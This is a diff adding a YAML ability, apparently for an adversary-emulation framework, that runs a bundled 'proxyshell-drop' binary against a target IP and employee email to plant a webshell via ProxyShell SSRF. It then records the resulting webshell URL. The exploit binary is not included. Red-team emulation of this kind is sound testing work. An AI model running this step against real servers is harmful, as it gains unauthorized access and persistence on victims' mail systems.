@@ -1,0 +1,22 @@
+- id: f3369229-12b5-42b8-b26b-87262802d139
+  name: Drop shell through ProxyShell SSRF
+  description: Drop shell through ProxyShell SSRF
+  tactic: initial-access
+  technique:
+    attack_id: T1190
+    name: "Exploit Public-Facing Application"
+  platforms:
+    linux:
+      sh:
+        command: "chmod +x ./proxyshell-drop && ./proxyshell-drop -u '#{target.remote.ip}' -e '#{target.employee.email}'"
+        timeout: 60
+        payloads:
+          - proxyshell-drop
+        parsers:
+          plugins.precomp.app.parsers.proxyshell_shell:
+            - source: target.webshell.url
+  requirements:
+    - plugins.precomp.app.requirements.is_vuln_proxyshell:
+        - source: target.vulnerability
+          edge: vulnerable_to
+          target: target.remote.ip
